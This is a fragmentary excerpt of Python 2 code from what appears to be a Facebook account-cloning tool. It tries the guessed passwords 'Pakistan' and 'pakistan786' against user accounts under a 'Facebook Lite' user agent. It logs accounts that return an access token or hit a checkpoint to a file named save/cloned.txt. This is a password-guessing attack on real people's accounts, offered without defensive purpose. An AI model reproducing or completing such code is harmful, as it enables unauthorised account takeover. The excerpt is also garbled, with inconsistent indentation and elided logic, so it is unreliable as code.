...
br.addheaders = [('User-Agent', 'Facebook Lite')]
 				                                        ...
 				                                        if 'access_token' in q:
 				                                            ...
 				                                            if 'www.facebook.com' in q['error_msg']:
 				               		                	    ...
 				               		                	    pass7="Pakistan"
 				                                                    ...
 				                                                    q = json.load(data)
 				                                                    if 'access_token' in q:
 				                                                        print '\x1b[1;92m[OK] ' + k + c + user + '  |  ' + pass7
 				                                                        okb = open('save/cloned.txt', 'a')
 				                                                        ...
 				                                                        if 'www.facebook.com' in q['error_msg']:
 					                                                        print '\033[1;37m[CP] ' + k + c + user + '  |  ' + pass7
 					                                                        cps = open('save/cloned.txt', 'a')
 				               		                	    		...
 				               		                	    		pass8="pakistan786"
 				                                                    		...
 				                                                    		q = json.load(data)
 				                                                		if 'access_token' in q:
												    print '\x1b[1;92m[OK] ' + k + c + user + '  |  ' + pass8
 				                                                        	    okb = open('save/cloned.txt', 'a')
 				                                                                    ...
 				                                                                    if 'www.facebook.com' in q['error_msg']:
 					                                                                    print '\033[1;37m[CP] ' + k + c + user + '  |  ' + pass8
 					                                                                    cps = open('save/cloned.txt', 'a')
